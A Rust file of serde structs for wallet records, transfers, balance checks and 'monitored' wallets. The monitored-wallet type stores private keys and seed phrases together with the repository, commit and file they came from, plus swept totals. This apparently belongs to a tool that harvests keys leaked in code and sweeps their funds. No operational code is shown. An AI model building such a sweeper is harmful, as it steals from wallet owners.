use serde::{Deserialize, Serialize};

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct WalletInfo {
    pub address: String,
    pub private_key: String,
    pub balance: String,
    pub network: String,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct TransferResult {
    pub from_address: String,
    pub to_address: String,
    pub amount: String,
    pub tx_hash: String,
    pub success: bool,
    pub error: Option<String>,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct MonitoredWallet {
    pub address: String,
    pub private_key: String,
    pub seed_phrase: Option<String>,
    pub source_repo: String,
    pub source_commit: String,
    pub source_file: String,
    pub first_seen: String,
    pub last_checked: String,
    pub last_balance: String,
    pub total_swept: f64,
    pub status: String,
    pub tx_history: Vec<TxRecord>,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct TxRecord {
    pub tx_hash: String,
    pub amount: String,
    pub to_address: String,
    pub timestamp: String,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct BalanceCheckResult {
    pub address: String,
    pub balance: String,
    pub token_symbol: String,
    pub checked_at: String,
}